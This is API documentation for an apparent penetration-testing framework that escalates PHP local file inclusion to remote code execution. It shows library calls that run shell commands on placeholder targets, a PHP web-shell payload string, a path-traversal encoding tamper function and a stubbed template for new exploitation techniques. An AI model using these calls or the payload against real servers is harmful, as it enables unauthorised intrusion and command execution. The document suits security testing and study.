# Elle-Est-Fit API Documentation

This document provides detailed information about the Elle-Est-Fit framework's architecture, how to use it as a library, and how to extend it with custom techniques.

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [Using Elle-Est-Fit as a Library](#using-elle-est-fit-as-a-library)
- [Creating Custom Techniques](#creating-custom-techniques)
- [Handling Advanced LFI Scenarios](#handling-advanced-lfi-scenarios)
- [API Reference](#api-reference)

## Architecture Overview

Elle-Est-Fit is organized around these key components:

1. **Core Module** (`elle_est_fit/core.py`): Contains the main `LFI` class that orchestrates everything
2. **Techniques** (`elle_est_fit/techniques/`): Individual exploitation methods
3. **Payloads** (`elle_est_fit/payloads/`): Payload generators like filter chains
4. **CLI Interface** (`elle_est_fit/cli.py`): Command-line interface

### Project Structure
```
elle_est_fit/
├── init.py
├── cli.py
├── core.py
├── exceptions.py
├── techniques/
│ ├── init.py
│ ├── base.py
│ ├── php_filters.py
│ ├── php_session.py
│ ├── log_poisening.py
│ ├── pear_cmd.py
│ └── ... (other techniques)
└── payloads/
├── init.py
├── filter_chain.py
└── ... (other payload generators
```

## Using Elle-Est-Fit as a Library

### Basic Usage

```python
from elle_est_fit import LFI

# Create an LFI instance
lfi = LFI(
    target="http://vulnerable.com/index.php?file={}",
    technique="php_filters",
    verbose=True
)

# Attempt to exploit the vulnerability
if lfi.exploit():
    # Execute a command
    output = lfi.shell("whoami")
    print(output)
```

### Advanced Configuration

```python
from elle_est_fit import LFI

# Custom tampering function
def my_tamper(payload):
    # Perform custom modifications to the payload
    return payload.replace("..", "%2e%2e")

# Create an LFI instance with advanced options
lfi = LFI(
    target="http://vulnerable.com/index.php?file={}",
    technique="php_filters",
    double_url_encode=True,
    tamper=my_tamper,
    php_code="echo system($_GET['cmd']);"
)

# Attempt exploitation
lfi.exploit()
```

### Custom Request Handler

For cases where the built-in HTTP handling doesn't work (e.g., complex authentication, custom headers):

```python
from elle_est_fit import LFI

# Custom leak function that handles file retrieval
def custom_leak_function(file_path):
    # Implement custom HTTP request handling
    # Example: add special headers, handle authentication, etc.
    import requests
    
    url = f"http://vulnerable.com/index.php?file={file_path}"
    headers = {
        "Authorization": "Bearer token123",
        "X-Custom-Header": "value"
    }
    
    response = requests.get(url, headers=headers)
    return response.text

# Create LFI with custom leak function
lfi = LFI(
    leak_function=custom_leak_function,
    technique="php_filters"
)

# Note: When using a custom leak function, 
# you don't need to specify the target URL
```

## Creating Custom Techniques

All techniques inherit from the `TechniqueBase` class, which provides common functionality. To create a custom technique:

1. Create a new Python file in the `elle_est_fit/techniques/` directory
2. Define a class that inherits from `TechniqueBase`
3. Implement the required methods

### Template for Custom Technique

```python
"""
Custom technique implementation for LFI to RCE exploitation.
"""

import logging
import re
import random
import string
from typing import Optional

from ..exceptions import TechniqueError, ExecutionError
from ..techniques.base import TechniqueBase

logger = logging.getLogger("elle-est-fit")


class MyCustomTechnique(TechniqueBase):
    """
    Exploit LFI using a custom method.
    
    Detailed description of your technique here.
    """
    
    name = "my_custom"  # Name used to select this technique
    description = "LFI to RCE via my custom technique"
    
    def __init__(self, **kwargs):
        """Initialize the custom technique."""
        super().__init__(**kwargs)
        self.shell_token = ''.join(random.choice(string.ascii_letters) for _ in range(8))
        self.detection_string = f"ELLEESTFIT_{self.shell_token}"
        self.verbose = kwargs.get('verbose', False)
        
        # Add any technique-specific attributes here
        
    def detect(self) -> bool:
        """
        Detect if the target is vulnerable to this technique.
        
        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            # Implement detection logic here
            # For example, check if a specific file is accessible
            
            return True  # Return True if vulnerable
        except Exception as e:
            logger.debug(f"Detection failed: {str(e)}")
            return False
            
    def exploit(self) -> bool:
        """
        Exploit the LFI vulnerability to achieve RCE.
        
        Returns:
            bool: True if exploitation was successful, False otherwise
        """
        try:
            # Implement your exploitation logic here
            # This usually involves:
            # 1. Creating/injecting a payload
            # 2. Accessing it via LFI
            # 3. Verifying execution
            
            # Set self.shell_path if successful
            self.shell_path = "/path/to/your/shell"
            
            return True  # Return True if successful
        except Exception as e:
            logger.error(f"Exploitation failed: {str(e)}")
            return False
            
    def execute(self, command: str) -> str:
        """
        Execute a command using the established shell.
        
        Args:
            command: Command to execute
            
        Returns:
            str: Command output
        """
        if not self.shell_path:
            raise ExecutionError("No shell established. Run exploit() first.")
            
        try:
            # Implement command execution logic
            # This usually involves making a request that triggers
            # your implanted shell with the command
            
            return "Command output here"
        except Exception as e:
            raise ExecutionError(f"Command execution failed: {str(e)}")
```

### Required Methods

Each technique must implement these methods:

1. **detect()**: Determines if the target is vulnerable to this technique
2. **exploit()**: Attempts to exploit the vulnerability to achieve RCE
3. **execute(command)**: Executes commands using the established shell

## Handling Advanced LFI Scenarios

### 2nd Order LFI Exploitation

For 2nd order LFI (where file inclusion happens after another action), you can use a custom leak function:

```python
from elle_est_fit import LFI
import requests

def second_order_leak(file_path):
    """
    Handle 2nd order LFI where the inclusion happens after another action.
    
    For example, if you need to:
    1. Upload a file with a specific name
    2. Trigger another page that includes that file
    """
    # Step 1: Set up the conditions for the LFI
    session = requests.Session()
    
    # For example, upload a file or set some state
    session.post("http://vulnerable.com/upload.php", 
                 data={"filename": file_path})
    
    # Step 2: Trigger the LFI
    response = session.get("http://vulnerable.com/view.php")
    return response.text

# Create LFI with custom leak function
lfi = LFI(
    leak_function=second_order_leak,
    technique="php_filters"
)

if lfi.exploit():
    print(lfi.shell("id"))
```

### Working with Complex Authentication

```python
from elle_est_fit import LFI
import requests

# First set up your authenticated session
session = requests.Session()
session.post("http://vulnerable.com/login.php", 
             data={"username": "admin", "password": "secret"})

def authenticated_leak(file_path):
    """Leak file contents using an authenticated session."""
    response = session.get(f"http://vulnerable.com/index.php?file={file_path}")
    return response.text

# Use the authenticated leak function
lfi = LFI(
    leak_function=authenticated_leak,
    technique="php_filters"
)

if lfi.exploit():
    print(lfi.shell("id"))
```

## API Reference

### LFI Class

```python
class LFI:
    def __init__(
        self, 
        target: str = None,
        leak_function: Callable[[str], str] = None,
        technique: str = None,
        double_url_encode: bool = False,
        tamper: Callable[[str], str] = None,
        php_code: str = None,
        custom_cmd: str = None,
        verbose: bool = False
    ):
        """
        Initialize LFI exploitation framework.
        
        Args:
            target: Target URL with LFI vulnerability (e.g., http://target.com/page.php?file={})
            leak_function: Custom function that takes a filename and returns its contents
            technique: Specific technique to use (if None, will try all available)
            double_url_encode: Whether to apply double URL encoding
            tamper: Custom function to modify the LFI parameter
            php_code: Custom PHP code to execute instead of default shells
            custom_cmd: Custom command to execute on successful RCE
            verbose: Enable verbose output
        """
        pass
        
    def exploit(self) -> bool:
        """
        Attempt to exploit the LFI vulnerability to achieve RCE.
        
        Returns:
            bool: True if exploitation was successful, False otherwise
        """
        pass
        
    def shell(self, command: str = None) -> str:
        """
        Execute a command using the established shell.
        
        Args:
            command: Command to execute (if None, will use self.custom_cmd)
            
        Returns:
            str: Command output
        """
        pass
```

### TechniqueBase Class

```python
class TechniqueBase:
    def __init__(
        self,
        target: str = None,
        leak_function: Callable[[str], str] = None,
        double_url_encode: bool = False,
        tamper: Callable[[str], str] = None,
        php_code: str = None
    ):
        """
        Initialize the technique.
        
        Args:
            target: Target URL with LFI vulnerability
            leak_function: Custom function that takes a filename and returns its contents
            double_url_encode: Whether to apply double URL encoding
            tamper: Custom function to modify the LFI parameter
            php_code: Custom PHP code to execute instead of default shells
        """
        pass
        
    @abc.abstractmethod
    def detect(self) -> bool:
        """
        Detect if the target is vulnerable to this technique.
        
        Returns:
            bool: True if vulnerable, False otherwise
        """
        pass
        
    @abc.abstractmethod
    def exploit(self) -> bool:
        """
        Exploit the LFI vulnerability to achieve RCE.
        
        Returns:
            bool: True if exploitation was successful, False otherwise
        """
        pass
        
    @abc.abstractmethod
    def execute(self, command: str) -> str:
        """
        Execute a command using the established shell.
        
        Args:
            command: Command to execute
            
        Returns:
            str: Command output
        """
        pass
```


## Contributing

When creating new techniques or payloads, please follow these guidelines:

1. Each technique should be in its own file
2. Name the file after the technique (e.g., `my_technique.py`)
3. Include a detailed module docstring explaining how the technique works
4. Implement all required methods from `TechniqueBase`
5. Add thorough error handling and logging